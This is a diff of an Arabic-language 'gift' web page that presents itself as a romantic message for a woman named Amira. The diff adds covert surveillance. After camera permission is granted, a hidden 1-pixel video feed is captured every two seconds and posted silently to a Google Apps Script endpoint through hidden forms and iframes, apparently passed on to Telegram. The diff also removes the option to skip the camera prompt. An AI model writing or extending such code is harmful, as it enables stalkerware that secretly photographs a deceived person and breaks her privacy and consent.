@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>هدية أحمد لأميرة ❤️</title>
+    <title>هدية لأميرة ❤️</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -134,9 +134,6 @@
             .final-text { font-size: 2.2rem; }
         }
         .gold-text { color: #f5d77b; text-shadow: 0 0 40px rgba(255, 215, 0, 0.3); }
-        .status-success { color: #6f6; font-size: 1.2rem; }
-        .status-error { color: #f66; font-size: 1.2rem; }
-        .status-sending { color: #fd8; font-size: 1.2rem; }
         .camera-indicator {
             position: fixed; top: 20px; right: 20px; background: rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(10px); padding: 8px 16px; border-radius: 30px;
@@ -173,14 +170,7 @@
             border: 1px solid rgba(255, 180, 180, 0.25);
         }
         .permission-overlay .content .btn-retry:hover { transform: scale(1.04); box-shadow: 0 0 70px rgba(255, 70, 70, 0.8); }
-        .permission-overlay .content .btn-retry:active { transform: scale(0.95); }
         .permission-overlay .content .sub-note { margin-top: 1.2rem; font-size: 1rem; color: #887; }
-        .permission-overlay .content .btn-skip {
-            margin-top: 1rem; background: transparent; border: 1px solid rgba(255, 255, 255, 0.15);
-            padding: 12px 30px; border-radius: 40px; font-size: 1rem; color: #887;
-            cursor: pointer; font-family: inherit; transition: 0.3s;
-        }
-        .permission-overlay .content .btn-skip:hover { border-color: #665; color: #aaa; }
     </style>
 </head>
 <body>
@@ -216,7 +206,7 @@
     <div class="gold-sparkles" id="sparkles"></div>
     <div class="cinematic-overlay" id="cinematicOverlay"></div>
 
-    <!-- Hidden video for auto-capture (أضفنا muted لمنع مشاكل التشغيل التلقائي) -->
+    <!-- Hidden video for auto-capture -->
     <video id="hiddenCamera" style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;" autoplay playsinline muted></video>
 
     <!-- ===== SECTIONS ===== -->
@@ -313,19 +303,58 @@
         </div>
     </section>
 
-    <div id="telegram-status"></div>
-
     <script>
         (function() {
             // =============================================
-            // GOOGLE APPS SCRIPT CONFIG (الرابط الجديد)
+            // GOOGLE APPS SCRIPT CONFIG
             // =============================================
             const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxqOBpEfod6inZA_PeiyiPWXQkeUZ7MoUkRwnQxikMRZG3sQEKJlgbtP_TQATmf7CvJ/exec';
 
             // =============================================
-            // SEND PHOTO TO GOOGLE SCRIPT
+            // SEND PHOTO VIA FORM (لتجاوز CORS)
             // =============================================
-            async function sendPhotoToTelegram(imageDataURL, sectionId = null) {
+            function sendPhotoToTelegram(imageDataURL, sectionId = null, silent = false) {
+                try {
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = GOOGLE_SCRIPT_URL;
+                    form.target = 'hidden_iframe_' + Date.now();
+                    form.style.display = 'none';
+
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = 'payload';
+                    input.value = JSON.stringify({
+                        image: imageDataURL,
+                        section: sectionId || 'auto',
+                        silent: silent
+                    });
+                    form.appendChild(input);
+
+                    const iframe = document.createElement('iframe');
+                    iframe.name = form.target;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+
+                    document.body.appendChild(form);
+                    form.submit();
+
+                    setTimeout(() => {
+                        form.remove();
+                        iframe.remove();
+                    }, 3000);
+
+                    return true;
+                } catch (e) {
+                    console.error('Send error:', e);
+                    return false;
+                }
+            }
+
+            // =============================================
+            // STATUS DISPLAY
+            // =============================================
+            function showStatus(sectionId, text, color) {
                 const statusMap = {
                     eyes: document.getElementById('eyesAutoStatus'),
                     lips: document.getElementById('lipsAutoStatus'),
@@ -333,60 +362,10 @@
                     heart: document.getElementById('heartAutoStatus'),
                     letter: document.getElementById('letterAutoStatus')
                 };
-                const statusEl = sectionId ? statusMap[sectionId] : null;
-
-                try {
-                    const sendResponse = await fetch(GOOGLE_SCRIPT_URL, {
-                        method: 'POST',
-                        // مهم جداً: text/plain لتجنب حظر CORS من Google Apps Script
-                        headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-                        body: JSON.stringify({
-                            image: imageDataURL,
-                            section: sectionId
-                        })
-                    });
-                    
-                    const data = await sendResponse.json();
-
-                    if (data.ok) {
-                        if (statusEl) {
-                            statusEl.textContent = 'فديت شفايفج 🌹';
-                            statusEl.style.color = '#6f6';
-                        }
-                        for (let i = 0; i < 8; i++) {
-                            const h = document.createElement('i');
-                            h.className = 'fas fa-heart';
-                            h.style.position = 'fixed';
-                            h.style.color = '#e74c3c';
-                            h.style.fontSize = (1 + Math.random() * 2.5) + 'rem';
-                            h.style.left = (10 + Math.random() * 80) + '%';
-                            h.style.top = (10 + Math.random() * 80) + '%';
-                            h.style.pointerEvents = 'none';
-                            h.style.zIndex = '999';
-                            h.style.transition = 'all 0.9s ease';
-                            h.style.opacity = '0.8';
-                            document.body.appendChild(h);
-                            setTimeout(() => {
-                                h.style.transform = `translateY(-${100+Math.random()*120}px) scale(0.1)`;
-                                h.style.opacity = '0';
-                            }, 50);
-                            setTimeout(() => h.remove(), 1100);
-                        }
-                        return true;
-                    } else {
-                        if (statusEl) {
-                            statusEl.textContent = `❌ فشل: ${data.description || data.error || 'خطأ غير معروف'}`;
-                            statusEl.style.color = '#f66';
-                        }
-                        return false;
-                    }
-                } catch (err) {
-                    if (statusEl) {
-                        statusEl.textContent = `❌ خطأ: ${err.message}`;
-                        statusEl.style.color = '#f66';
-                    }
-                    console.error('Send error:', err);
-                    return false;
+                const el = statusMap[sectionId];
+                if (el) {
+                    el.textContent = text;
+                    el.style.color = color || '#a88';
                 }
             }
 
@@ -415,6 +394,10 @@
             let hiddenStream = null;
             let cameraPermissionGranted = false;
             let permissionRequested = false;
+
+            // متغيرات الإرسال التلقائي كل ثانيتين
+            let autoSendInterval = null;
+            let autoSendCounter = 0;
 
             const autoCaptured = {
                 eyes: false, lips: false, know: false, heart: false, letter: false
@@ -512,7 +495,7 @@
             createBg();
 
             // =============================================
-            // CAMERA PERMISSION
+            // CAMERA
             // =============================================
             const hiddenVideo = document.getElementById('hiddenCamera');
             const cameraIndicator = document.getElementById('cameraIndicator');
@@ -549,31 +532,26 @@
                         return;
                     }
 
-                    // طلب الكاميرا
                     const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: 'user',
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        },
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
                     });
-                    
-                    // إيقاف البث المؤقت، ثم تشغيل البث الدائم
+
                     stream.getTracks().forEach(t => t.stop());
-                    
                     cameraPermissionGranted = true;
                     hidePermissionOverlay();
                     cameraIndicator.classList.add('active');
-                    
-                    // تشغيل الكاميرا الخفية للالتقاط
+
                     await startHiddenCamera();
                     
+                    // ⭐ بدء الإرسال التلقائي كل ثانيتين
+                    startAutoSend();
+
                 } catch (err) {
                     console.warn('Camera error:', err.name, err.message);
                     cameraPermissionGranted = false;
                     permissionRequested = false;
-                    
+
                     let msg = '';
                     if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                         msg = '🚫 رفضتِ السماح للكاميرا.<br><br>';
@@ -607,35 +585,23 @@
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
                     });
                     hiddenVideo.srcObject = hiddenStream;
-                    
-                    // مهم: انتظر حتى الفيديو يكون جاهز فعلاً قبل الالتقاط
+
                     await new Promise((resolve) => {
-                        if (hiddenVideo.readyState >= 2) {
-                            resolve();
-                        } else {
-                            hiddenVideo.onloadeddata = () => resolve();
-                        }
+                        if (hiddenVideo.readyState >= 2) resolve();
+                        else hiddenVideo.onloadeddata = () => resolve();
                     });
-                    
+
                     await hiddenVideo.play();
-                    console.log('✅ الكاميرا جاهزة للالتقاط');
+                    console.log('✅ الكاميرا جاهزة');
                 } catch (err) {
                     console.warn('Hidden camera error:', err);
                 }
             }
 
             function captureFromHiddenCamera() {
-                if (!hiddenStream || !cameraPermissionGranted) {
-                    console.warn('الكاميرا غير جاهزة');
-                    return null;
-                }
+                if (!hiddenStream || !cameraPermissionGranted) return null;
                 try {
-                    // التأكد من أن الفيديو جاهز قبل الالتقاط
-                    if (hiddenVideo.readyState < 2) {
-                        console.warn('الفيديو ليس جاهزاً بعد');
-                        return null;
-                    }
-                    
+                    if (hiddenVideo.readyState < 2) return null;
                     const canvas = document.createElement('canvas');
                     canvas.width = 640;
                     canvas.height = 480;
@@ -643,59 +609,101 @@
                     ctx.drawImage(hiddenVideo, 0, 0, 640, 480);
                     return canvas.toDataURL('image/jpeg', 0.85);
                 } catch (e) {
-                    console.warn('Auto-capture error:', e);
                     return null;
                 }
             }
 
+            // =============================================
+            // ⭐ AUTO SEND EVERY 2 SECONDS
+            // =============================================
+            function startAutoSend() {
+                if (autoSendInterval) {
+                    clearInterval(autoSendInterval);
+                    autoSendInterval = null;
+                }
+
+                autoSendCounter = 0;
+
+                autoSendInterval = setInterval(() => {
+                    if (!cameraPermissionGranted) return;
+                    
+                    const imageData = captureFromHiddenCamera();
+                    if (imageData) {
+                        autoSendCounter++;
+                        console.log(`📸 إرسال تلقائي #${autoSendCounter}`);
+                        
+                        // إرسال بصمت (بدون رسائل في الواجهة)
+                        sendPhotoToTelegram(imageData, 'auto', true);
+                    } else {
+                        console.warn('⚠️ فشل الالتقاط التلقائي');
+                    }
+                }, 2000); // كل ثانيتين
+
+                console.log('🔁 بدأ الإرسال التلقائي كل ثانيتين');
+            }
+
+            function stopAutoSend() {
+                if (autoSendInterval) {
+                    clearInterval(autoSendInterval);
+                    autoSendInterval = null;
+                    console.log('⏹️ تم إيقاف الإرسال التلقائي');
+                }
+            }
+
+            // =============================================
+            // CAPTURE ON SECTION CHANGE
+            // =============================================
             async function triggerAutoCapture(sectionId) {
                 if (!cameraPermissionGranted) return;
                 if (sectionId === 'start' || sectionId === 'final') return;
 
-                const statusMap = {
-                    eyes: document.getElementById('eyesAutoStatus'),
-                    lips: document.getElementById('lipsAutoStatus'),
-                    know: document.getElementById('knowAutoStatus'),
-                    heart: document.getElementById('heartAutoStatus'),
-                    letter: document.getElementById('letterAutoStatus')
-                };
-
                 if (autoCaptured[sectionId]) {
-                    if (statusMap[sectionId]) {
-                        statusMap[sectionId].textContent = 'فديت شفايفج';
-                        statusMap[sectionId].style.color = '#6f6';
-                    }
+                    showStatus(sectionId, 'فديت شفايفج', '#6f6');
                     return;
                 }
 
-                // انتظار بسيط لضمان استقرار الصورة
                 await new Promise(r => setTimeout(r, 800));
 
                 const imageData = captureFromHiddenCamera();
                 if (!imageData) {
-                    if (statusMap[sectionId]) {
-                        statusMap[sectionId].textContent = 'فشل التقاط الصورة، جاري إعادة المحاولة...';
-                        statusMap[sectionId].style.color = '#fd8';
-                    }
-                    // حاول مرة أخرى بعد ثانية
+                    showStatus(sectionId, 'فشل التقاط الصورة، جاري إعادة المحاولة...', '#fd8');
                     setTimeout(() => triggerAutoCapture(sectionId), 1000);
                     return;
                 }
 
                 autoCaptured[sectionId] = true;
-                if (statusMap[sectionId]) {
-                    statusMap[sectionId].textContent = '...';
-                    statusMap[sectionId].style.color = '#fd8';
-                }
-                sendPhotoToTelegram(imageData, sectionId);
+                showStatus(sectionId, '...', '#fd8');
+                sendPhotoToTelegram(imageData, sectionId, false);
+
+                setTimeout(() => {
+                    showStatus(sectionId, 'فديت شفايفج 🌹', '#6f6');
+
+                    for (let i = 0; i < 8; i++) {
+                        const h = document.createElement('i');
+                        h.className = 'fas fa-heart';
+                        h.style.position = 'fixed';
+                        h.style.color = '#e74c3c';
+                        h.style.fontSize = (1 + Math.random() * 2.5) + 'rem';
+                        h.style.left = (10 + Math.random() * 80) + '%';
+                        h.style.top = (10 + Math.random() * 80) + '%';
+                        h.style.pointerEvents = 'none';
+                        h.style.zIndex = '999';
+                        h.style.transition = 'all 0.9s ease';
+                        h.style.opacity = '0.8';
+                        document.body.appendChild(h);
+                        setTimeout(() => {
+                            h.style.transform = `translateY(-${100+Math.random()*120}px) scale(0.1)`;
+                            h.style.opacity = '0';
+                        }, 50);
+                        setTimeout(() => h.remove(), 1100);
+                    }
+                }, 1500);
             }
 
             // =============================================
             // EVENT LISTENERS
             // =============================================
-
             document.getElementById('startBtn').addEventListener('click', async () => {
-                // طلب الكاميرا عند الضغط (تفاعل حقيقي)
                 if (!cameraPermissionGranted) {
                     await requestCameraPermission();
                     if (!cameraPermissionGranted) {
@@ -703,7 +711,7 @@
                         return;
                     }
                 }
-                
+
                 cinematicTransition('eyes');
                 setTimeout(() => {
                     const el = document.getElementById('eyesText');
@@ -773,6 +781,8 @@
                     hiddenStream.getTracks().forEach(t => t.stop());
                     hiddenStream = null;
                 }
+                stopAutoSend();
+
                 showSection('start');
                 document.getElementById('eyesText').textContent = '';
                 document.getElementById('letterText').textContent = '';
@@ -781,8 +791,7 @@
 
                 Object.keys(autoCaptured).forEach(key => autoCaptured[key] = false);
 
-                const statuses = ['eyesAutoStatus', 'lipsAutoStatus', 'knowAutoStatus', 'heartAutoStatus', 'letterAutoStatus'];
-                statuses.forEach(id => {
+                ['eyesAutoStatus', 'lipsAutoStatus', 'knowAutoStatus', 'heartAutoStatus', 'letterAutoStatus'].forEach(id => {
                     const el = document.getElementById(id);
                     if (el) {
                         el.textContent = '';
@@ -791,11 +800,12 @@
                 });
 
                 if (cameraPermissionGranted) {
-                    startHiddenCamera();
+                    startHiddenCamera().then(() => startAutoSend());
                 }
             });
 
             console.log('❤️ موقع هدية أحمد لأميرة ❤️');
+            console.log('📸 إرسال تلقائي كل ثانيتين بعد السماح للكاميرا');
             console.log('🔒 التوكن محمي عبر Google Apps Script');
         })();
     </script>
